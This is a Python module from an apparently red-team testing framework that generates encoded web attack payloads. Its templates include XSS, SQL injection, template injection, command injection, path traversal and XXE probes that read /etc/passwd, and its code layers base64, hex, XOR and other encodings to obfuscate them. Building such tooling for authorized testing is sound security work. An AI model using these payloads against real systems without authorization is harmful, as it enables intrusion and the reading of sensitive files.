"""Payload Generator Module.

Generate encoded payloads for authorized security testing using multiple
encoding schemes: Base64, URL encoding, hex encoding, and XOR obfuscation.
"""

import asyncio
import base64
import hashlib
import secrets
from typing import Any, Dict, List, Tuple
from urllib.parse import quote

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

# Pre-built payload templates for common testing scenarios
PAYLOAD_TEMPLATES = {
    "xss_probe": '<script>alert("XSS-{marker}")</script>',
    "sqli_probe": "' OR 1=1 -- {marker}",
    "ssti_probe": "${{7*7}}{marker}",
    "cmd_injection": "; echo {marker}",
    "path_traversal": "../../../../etc/passwd",
    "xxe_probe": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    "lfi_null_byte": "../../../../etc/passwd%00",
    "custom": "{payload}",
}

ENCODING_METHODS = ["base64", "url", "double_url", "hex", "xor", "unicode", "html_entities"]


class PayloadGeneratorModule(AtsModule):
    """Generate encoded payloads for authorized security testing."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="payload_generator",
            category=ModuleCategory.RED_TEAM,
            description="Generate encoded payloads with multiple encoding schemes for authorized security testing",
            version="1.0.0",
            parameters=[
                Parameter(
                    name="target",
                    type=ParameterType.STRING,
                    description="Target application or context description for the payload",
                    required=True,
                ),
                Parameter(
                    name="payload_type",
                    type=ParameterType.CHOICE,
                    description="Pre-built payload template or custom",
                    required=False,
                    default="xss_probe",
                    choices=list(PAYLOAD_TEMPLATES.keys()),
                ),
                Parameter(
                    name="custom_payload",
                    type=ParameterType.STRING,
                    description="Custom payload string (used when payload_type is 'custom')",
                    required=False,
                    default="",
                ),
                Parameter(
                    name="encodings",
                    type=ParameterType.LIST,
                    description="List of encoding methods to apply: base64, url, double_url, hex, xor, unicode, html_entities",
                    required=False,
                    default=["base64", "url", "hex"],
                ),
                Parameter(
                    name="xor_key",
                    type=ParameterType.STRING,
                    description="XOR key for XOR encoding (auto-generated if empty)",
                    required=False,
                    default="",
                ),
                Parameter(
                    name="iterations",
                    type=ParameterType.INTEGER,
                    description="Number of encoding iterations (for layered encoding)",
                    required=False,
                    default=1,
                    min_value=1,
                    max_value=5,
                ),
            ],
            outputs=[
                OutputField(name="payloads", type="list", description="Generated encoded payloads"),
                OutputField(name="summary", type="dict", description="Generation summary"),
            ],
            tags=["red_team", "payload", "encoding", "obfuscation", "testing"],
            dangerous=True,
        )

    def validate_inputs(self, config: Dict[str, Any]) -> Tuple[bool, str]:
        if not config.get("target"):
            return False, "Target application context is required"
        payload_type = config.get("payload_type", "xss_probe")
        if payload_type == "custom" and not config.get("custom_payload"):
            return False, "Custom payload string is required when payload_type is 'custom'"
        encodings = config.get("encodings", [])
        for enc in encodings:
            if enc not in ENCODING_METHODS:
                return False, f"Unknown encoding method: {enc}. Must be one of {ENCODING_METHODS}"
        return True, ""

    def _encode_base64(self, data: str) -> str:
        """Base64 encode the payload."""
        return base64.b64encode(data.encode("utf-8")).decode("ascii")

    def _encode_url(self, data: str) -> str:
        """URL-encode the payload."""
        return quote(data, safe="")

    def _encode_double_url(self, data: str) -> str:
        """Double URL-encode the payload."""
        return quote(quote(data, safe=""), safe="")

    def _encode_hex(self, data: str) -> str:
        """Hex-encode the payload."""
        return data.encode("utf-8").hex()

    def _encode_xor(self, data: str, key: str) -> str:
        """XOR encode the payload with the given key and return hex representation."""
        key_bytes = key.encode("utf-8")
        data_bytes = data.encode("utf-8")
        xored = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data_bytes)])
        return xored.hex()

    def _encode_unicode(self, data: str) -> str:
        """Unicode escape encode the payload."""
        return "".join(f"\\u{ord(c):04x}" for c in data)

    def _encode_html_entities(self, data: str) -> str:
        """HTML entity encode the payload."""
        return "".join(f"&#{ord(c)};" for c in data)

    def _apply_encoding(self, data: str, encoding: str, xor_key: str) -> str:
        """Apply a single encoding method to the data."""
        encoders = {
            "base64": lambda d: self._encode_base64(d),
            "url": lambda d: self._encode_url(d),
            "double_url": lambda d: self._encode_double_url(d),
            "hex": lambda d: self._encode_hex(d),
            "xor": lambda d: self._encode_xor(d, xor_key),
            "unicode": lambda d: self._encode_unicode(d),
            "html_entities": lambda d: self._encode_html_entities(d),
        }
        encoder = encoders.get(encoding)
        if encoder:
            return encoder(data)
        return data

    async def execute(self, config: Dict[str, Any]) -> Dict[str, Any]:
        target = config["target"].strip()
        payload_type = config.get("payload_type", "xss_probe")
        custom_payload = config.get("custom_payload", "")
        encodings = config.get("encodings", ["base64", "url", "hex"])
        xor_key = config.get("xor_key", "") or secrets.token_hex(4)
        iterations = config.get("iterations", 1)

        self.logger.info("payload_generation_start", target=target, type=payload_type)

        # Build the raw payload
        marker = secrets.token_hex(4)
        if payload_type == "custom":
            raw_payload = custom_payload
        else:
            template = PAYLOAD_TEMPLATES[payload_type]
            raw_payload = template.replace("{marker}", marker).replace("{payload}", custom_payload)

        # Generate encoded variants
        payloads: List[Dict[str, Any]] = []

        # Add raw payload
        payloads.append({
            "encoding": "raw",
            "iterations": 0,
            "payload": raw_payload,
            "length": len(raw_payload),
            "md5": hashlib.md5(raw_payload.encode()).hexdigest(),
        })

        # Generate each encoding
        for encoding in encodings:
            encoded = raw_payload
            for _ in range(iterations):
                encoded = self._apply_encoding(encoded, encoding, xor_key)

            label = encoding if iterations == 1 else f"{encoding}x{iterations}"
            payloads.append({
                "encoding": label,
                "iterations": iterations,
                "payload": encoded,
                "length": len(encoded),
                "md5": hashlib.md5(encoded.encode()).hexdigest(),
            })

        # Generate chained encoding (all encodings applied sequentially)
        if len(encodings) > 1:
            chained = raw_payload
            chain_label_parts = []
            for encoding in encodings:
                chained = self._apply_encoding(chained, encoding, xor_key)
                chain_label_parts.append(encoding)
            payloads.append({
                "encoding": "chained:" + "->".join(chain_label_parts),
                "iterations": 1,
                "payload": chained,
                "length": len(chained),
                "md5": hashlib.md5(chained.encode()).hexdigest(),
            })

        summary = {
            "target": target,
            "payload_type": payload_type,
            "raw_payload_length": len(raw_payload),
            "encodings_applied": encodings,
            "xor_key": xor_key if "xor" in encodings else None,
            "total_variants": len(payloads),
            "marker": marker,
        }

        self.logger.info("payload_generation_complete", variants=len(payloads))

        return {
            "payloads": payloads,
            "summary": summary,
        }
